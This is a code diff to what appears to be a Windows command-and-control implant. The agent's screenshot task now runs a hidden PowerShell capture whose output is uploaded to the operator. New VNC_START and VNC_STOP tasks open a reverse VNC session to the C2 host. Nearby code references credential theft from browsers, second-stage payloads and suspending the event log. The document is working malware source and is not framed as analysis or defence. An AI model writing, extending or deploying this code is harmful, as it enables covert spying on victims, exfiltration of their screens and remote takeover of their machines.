@@ -25,6 +25,7 @@
 #include "pe_exec.h"
 #include "dotnet.h"
 #include "browsercreds.h"
+#include "vnc.h"
 #include <bcrypt.h>
 #include <winternl.h>
 
@@ -2817,99 +2818,44 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, msg, "");
     }
     else if (strcmp(type_upper, "SCREENSHOT") == 0) {
-        /* Native GDI capture with WinSta0/Default desktop access so it works
-         * from session 0 (SYSTEM service) when an interactive session exists.
-         * Output is a BMP file (GUI accepts .bmp). */
-        const char *sc_path = "C:\\Windows\\Temp\\_sc.bmp";
-
-        HWINSTA hOrigSta = GetProcessWindowStation();
-        HWINSTA hSta = OpenWindowStationA("WinSta0", FALSE,
-            WINSTA_ALL_ACCESS | READ_CONTROL);
-        if (hSta) SetProcessWindowStation(hSta);
-
-        HDESK hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
-        /* DESKTOP_ALL_ACCESS not defined in older MinGW — use explicit mask */
-        DWORD desk_access = DESKTOP_READOBJECTS|DESKTOP_CREATEWINDOW|DESKTOP_CREATEMENU|
-                            DESKTOP_HOOKCONTROL|DESKTOP_JOURNALRECORD|DESKTOP_JOURNALPLAYBACK|
-                            DESKTOP_ENUMERATE|DESKTOP_WRITEOBJECTS|DESKTOP_SWITCHDESKTOP|READ_CONTROL;
-        HDESK hDesk = OpenDesktopA("Default", 0, FALSE, desk_access);
-        if (hDesk) SetThreadDesktop(hDesk);
-
-        HDC hDC   = GetDC(NULL);
-        int sw    = GetSystemMetrics(SM_CXSCREEN);
-        int sh    = GetSystemMetrics(SM_CYSCREEN);
-
-        int ok_flag = 0;
-        int no_desktop = 0;
-        if (hDC && sw > 0 && sh > 0) {
-            HDC hMemDC = CreateCompatibleDC(hDC);
-            HBITMAP hBmp = CreateCompatibleBitmap(hDC, sw, sh);
-            HGDIOBJ hOld = SelectObject(hMemDC, hBmp);
-            BitBlt(hMemDC, 0, 0, sw, sh, hDC, 0, 0, SRCCOPY | CAPTUREBLT);
-            SelectObject(hMemDC, hOld);
-
-            BITMAPINFOHEADER bi = {0};
-            bi.biSize        = sizeof(bi);
-            bi.biWidth       = sw;
-            bi.biHeight      = -sh; /* top-down */
-            bi.biPlanes      = 1;
-            bi.biBitCount    = 24;
-            bi.biCompression = BI_RGB;
-            int row_sz = (sw * 3 + 3) & ~3;
-            DWORD data_sz = (DWORD)((size_t)row_sz * (size_t)sh);
-            uint8_t *pixels = (uint8_t*)malloc(data_sz);
-            if (pixels) {
-                GetDIBits(hMemDC, hBmp, 0, (UINT)sh,
-                    pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
-
-                int all_black = 1;
-                for (DWORD _pi = 0; _pi < data_sz && all_black; _pi++) {
-                    if (pixels[_pi] != 0) all_black = 0;
-                }
-                if (all_black) {
-                    no_desktop = 1;
-                } else {
-                BITMAPFILEHEADER bfh = {0};
-                bfh.bfType   = 0x4D42;
-                bfh.bfSize   = (DWORD)(sizeof(bfh) + sizeof(bi) + data_sz);
-                bfh.bfOffBits= (DWORD)(sizeof(bfh) + sizeof(bi));
-
-                HANDLE hF = CreateFileA(sc_path, GENERIC_WRITE, 0, NULL,
-                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                if (hF != INVALID_HANDLE_VALUE) {
-                    DWORD wr;
-                    WriteFile(hF, &bfh, sizeof(bfh), &wr, NULL);
-                    WriteFile(hF, &bi, sizeof(bi), &wr, NULL);
-                    WriteFile(hF, pixels, data_sz, &wr, NULL);
-                    CloseHandle(hF);
-                    ok_flag = 1;
-                }
-                } /* end !all_black */
-                free(pixels);
+        /* PowerShell CopyFromScreen — works from any session context without
+         * GDI thread-affinity issues (SetProcessWindowStation/SetThreadDesktop). */
+        const char *ps =
+            "Add-Type -AssemblyName System.Drawing,System.Windows.Forms;"
+            "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
+            "$bmp=[System.Drawing.Bitmap]::new($s.Width,$s.Height);"
+            "$gfx=[System.Drawing.Graphics]::FromImage($bmp);"
+            "$gfx.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
+            "$ms=[System.IO.MemoryStream]::new();"
+            "$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png);"
+            "[Convert]::ToBase64String($ms.ToArray())";
+        char cmd[2048];
+        snprintf(cmd, sizeof(cmd),
+            "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", ps);
+        char *b64out = run_shell(cmd);
+        if (!b64out || b64out[0] == '\0') {
+            free(b64out);
+            agent_send_result(task->id, "", "screenshot: powershell returned empty");
+        } else {
+            /* strip trailing whitespace/newlines from base64 output */
+            size_t b64len = strlen(b64out);
+            while (b64len > 0 && (b64out[b64len-1] == '\r' || b64out[b64len-1] == '\n' ||
+                                   b64out[b64len-1] == ' ')) {
+                b64out[--b64len] = '\0';
             }
-            DeleteDC(hMemDC);
-            DeleteObject(hBmp);
-            ReleaseDC(NULL, hDC);
-        }
-
-        if (hDesk) { SetThreadDesktop(hOrigDesk); CloseDesktop(hDesk); }
-        if (hSta)  { SetProcessWindowStation(hOrigSta); CloseWindowStation(hSta); }
-
-        if (no_desktop) {
-            agent_send_result(task->id, "", "screenshot: no_interactive_desktop");
-        } else if (ok_flag) {
-            HANDLE hF = CreateFileA(sc_path, GENERIC_READ, FILE_SHARE_READ, NULL,
-                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-            if (hF != INVALID_HANDLE_VALUE) {
-                DWORD fsz = GetFileSize(hF, NULL);
-                uint8_t *data = (uint8_t*)malloc(fsz);
-                DWORD rd = 0; ReadFile(hF, data, fsz, &rd, NULL); CloseHandle(hF);
-                agent_upload_file(task->id, "screenshot.bmp", data, rd);
-                free(data); DeleteFileA(sc_path);
-                char m[64]; snprintf(m, 64, "[+] screenshot (%lu bytes)", rd);
+            size_t png_len = 0;
+            uint8_t *png = b64_decode(b64out, &png_len);
+            free(b64out);
+            if (!png || png_len == 0) {
+                free(png);
+                agent_send_result(task->id, "", "screenshot: base64 decode failed");
+            } else {
+                agent_upload_file(task->id, "screenshot.png", png, (DWORD)png_len);
+                free(png);
+                char m[64]; snprintf(m, 64, "[+] screenshot (%zu bytes)", png_len);
                 agent_send_result(task->id, m, "");
-            } else agent_send_result(task->id, "", "screenshot: read failed");
-        } else agent_send_result(task->id, "", "screenshot: GDI capture failed");
+            }
+        }
     }
     else if (strcmp(type_upper, "STAGE2") == 0) {
         if (!task->payload || task->payload_len == 0) {
@@ -5543,6 +5489,41 @@ void dispatch_task(AgentTask *task) {
         snprintf(msg, sizeof(msg), "[+] EventLog %s: %d thread(s) affected",
                  do_suspend ? "suspended" : "resumed", count);
         agent_send_result(task->id, msg, "");
+    }
+    else if (strcmp(type_upper, "VNC_START") == 0) {
+        /* args: "<port> <quality> [<pid> [<session> [<mode>]]]"
+         * Connects back to the operator's VNC listener on the C2 host. */
+        int port = 0, quality = 60;
+        if (task->args && task->args[0]) {
+            char argbuf[256];
+            strncpy(argbuf, task->args, sizeof(argbuf)-1);
+            argbuf[sizeof(argbuf)-1] = '\0';
+            char *tok = strtok(argbuf, " ");
+            if (tok) { port    = atoi(tok); tok = strtok(NULL, " "); }
+            if (tok) { quality = atoi(tok); }
+        }
+        if (port <= 0) {
+            agent_send_result(task->id, "", "VNC_START: missing port"); return;
+        }
+        /* Extract host from AGENT_SERVER_URL ("http://host:port" or "https://...") */
+        char c2_host[256] = "127.0.0.1";
+        {
+            const char *url = AGENT_SERVER_URL;
+            const char *p = strstr(url, "://");
+            p = p ? p + 3 : url;
+            const char *end = strpbrk(p, ":/");
+            size_t hlen = end ? (size_t)(end - p) : strlen(p);
+            if (hlen > 0 && hlen < sizeof(c2_host))  {
+                memcpy(c2_host, p, hlen);
+                c2_host[hlen] = '\0';
+            }
+        }
+        vnc_start_ps(c2_host, port, quality, 0);
+        agent_send_result(task->id, "[+] VNC session started", "");
+    }
+    else if (strcmp(type_upper, "VNC_STOP") == 0) {
+        vnc_stop();
+        agent_send_result(task->id, "[+] VNC session stopped", "");
     }
 #endif /* _WIN32 */
     else {
